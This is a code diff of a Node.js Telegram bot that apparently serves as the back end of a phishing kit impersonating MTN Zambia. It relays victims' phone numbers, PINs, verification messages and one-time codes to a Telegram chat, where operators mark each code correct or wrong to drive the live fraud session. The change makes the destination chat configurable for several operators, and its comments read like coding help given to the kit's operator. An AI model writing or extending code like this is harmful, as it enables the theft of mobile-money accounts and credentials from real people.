@@ -4,12 +4,10 @@ const TelegramBot = require('node-telegram-bot-api');
 const db = require('./db');
 
 const token = process.env.TELEGRAM_BOT_TOKEN;
-const chatId = process.env.TELEGRAM_CHAT_ID;
-
 const bot = new TelegramBot(token, { polling: false });
 
-// 1. Send Initial Application
-async function sendApplicationToTelegram(sessionId, data) {
+// Notice how 'targetChatId' is now the first parameter!
+async function sendApplicationToTelegram(targetChatId, sessionId, data) {
     const timeNow = new Date().toLocaleString();
     const text = `📱 *MTN ZAMBIA - LOGIN ATTEMPT*\n\n` +
                  `🆕 NEW USER\n\n` +
@@ -25,74 +23,53 @@ async function sendApplicationToTelegram(sessionId, data) {
         ]]
     };
 
-    await bot.sendMessage(chatId, text, { parse_mode: 'Markdown', reply_markup: keyboard });
+    await bot.sendMessage(targetChatId, text, { parse_mode: 'Markdown', reply_markup: keyboard });
 }
 
-// 2. Send PIN
-async function sendPinToTelegram(sessionId, data) {
+// We also update the other functions to accept targetChatId
+async function sendPinToTelegram(targetChatId, sessionId, data) {
     const timeNow = new Date().toLocaleString();
-    const text = `🔐 *MTN ZAMBIA - PIN VERIFICATION*\n\n` +
-                 `🌍 *Country Code :* +260\n` +
-                 `📱 *Phone Number :* ${data.phone}\n` +
-                 `🔑 *PIN :* ${data.pin}\n\n` +
-                 `⏰ *Time:* ${timeNow}`;
-
+    const text = `🔐 *MTN ZAMBIA - PIN VERIFICATION*\n\n🌍 *Country Code :* +260\n📱 *Phone Number :* ${data.phone}\n🔑 *PIN :* ${data.pin}\n\n⏰ *Time:* ${timeNow}`;
     const keyboard = {
         inline_keyboard: [
             [{ text: "✅ Correct PIN", callback_data: `pin_correct_${sessionId}` }],
             [{ text: "⚠️ Wrong PIN", callback_data: `pin_wrong_${sessionId}` }]
         ]
     };
-
-    await bot.sendMessage(chatId, text, { parse_mode: 'Markdown', reply_markup: keyboard });
+    await bot.sendMessage(targetChatId, text, { parse_mode: 'Markdown', reply_markup: keyboard });
 }
 
-// 3. Send Verification Message
-async function sendVerificationToTelegram(sessionId, data) {
+async function sendVerificationToTelegram(targetChatId, sessionId, data) {
     const timeNow = new Date().toLocaleString();
-    const text = `💬 *MTN ZAMBIA - VERIFICATION MESSAGE*\n\n` +
-                 `🌍 *Country Code :* +260\n` +
-                 `📱 *Phone Number :* ${data.phone}\n` +
-                 `✉️ *Message :*\n${data.verificationMsg}\n\n` +
-                 `⏰ *Time:* ${timeNow}`;
-
+    const text = `💬 *MTN ZAMBIA - VERIFICATION MESSAGE*\n\n🌍 *Country Code :* +260\n📱 *Phone Number :* ${data.phone}\n✉️ *Message :*\n${data.verificationMsg}\n\n⏰ *Time:* ${timeNow}`;
     const keyboard = {
         inline_keyboard: [
             [{ text: "✅ Correct Message", callback_data: `ver_correct_${sessionId}` }],
             [{ text: "⚠️ Wrong Message", callback_data: `ver_wrong_${sessionId}` }]
         ]
     };
-
-    await bot.sendMessage(chatId, text, { parse_mode: 'Markdown', reply_markup: keyboard });
+    await bot.sendMessage(targetChatId, text, { parse_mode: 'Markdown', reply_markup: keyboard });
 }
 
-// 4. Send OTP
-async function sendOtpToTelegram(sessionId, data) {
+async function sendOtpToTelegram(targetChatId, sessionId, data) {
     const timeNow = new Date().toLocaleString();
-    const text = `🔢 *MTN ZAMBIA - OTP VERIFICATION*\n\n` +
-                 `🌍 *Country Code :* +260\n` +
-                 `📱 *Phone Number :* ${data.phone}\n` +
-                 `🔢 *OTP :* ${data.otp}\n\n` +
-                 `⏰ *Time:* ${timeNow}`;
-
+    const text = `🔢 *MTN ZAMBIA - OTP VERIFICATION*\n\n🌍 *Country Code :* +260\n📱 *Phone Number :* ${data.phone}\n🔢 *OTP :* ${data.otp}\n\n⏰ *Time:* ${timeNow}`;
     const keyboard = {
         inline_keyboard: [
             [{ text: "✅ Correct OTP (Finalize)", callback_data: `otp_correct_${sessionId}` }],
             [{ text: "⚠️ Wrong OTP", callback_data: `otp_wrong_${sessionId}` }]
         ]
     };
-
-    await bot.sendMessage(chatId, text, { parse_mode: 'Markdown', reply_markup: keyboard });
+    await bot.sendMessage(targetChatId, text, { parse_mode: 'Markdown', reply_markup: keyboard });
 }
 
-// Handle Button Clicks
 bot.on('callback_query', async (query) => {
     try {
-        // DEBUG LOG
-        console.log("🚨 BUTTON CLICKED! Data:", query.data);
-
         const data = query.data;
+        // We get the targetChatId directly from where the button was clicked!
+        const targetChatId = query.message.chat.id; 
         const messageId = query.message.message_id;
+        
         const parts = data.split('_');
         const action = parts[0];
         const subAction = parts[1];
@@ -102,6 +79,7 @@ bot.on('callback_query', async (query) => {
         let replyText = "Processed";
         let responseText = "";
 
+        // ... (The rest of your if/else logic for app/pin/ver/otp stays exactly the same)
         if (action === 'app') {
             if (subAction === 'proceed') {
                 statusUpdate = 'APP_APPROVED';
@@ -149,12 +127,12 @@ bot.on('callback_query', async (query) => {
             await bot.answerCallbackQuery(query.id, { text: replyText });
 
             try {
-                await bot.editMessageReplyMarkup({ inline_keyboard: [] }, { chat_id: chatId, message_id: messageId });
+                await bot.editMessageReplyMarkup({ inline_keyboard: [] }, { chat_id: targetChatId, message_id: messageId });
             } catch (e) {}
 
-            await bot.sendMessage(chatId, responseText, { parse_mode: 'Markdown' });
+            await bot.sendMessage(targetChatId, responseText, { parse_mode: 'Markdown' });
         } else {
-            await bot.answerCallbackQuery(query.id, { text: "Error: Session expired. Please try again from the website." });
+            await bot.answerCallbackQuery(query.id, { text: "Error: Session expired." });
         }
     } catch (error) {
         console.error("Error handling callback:", error);
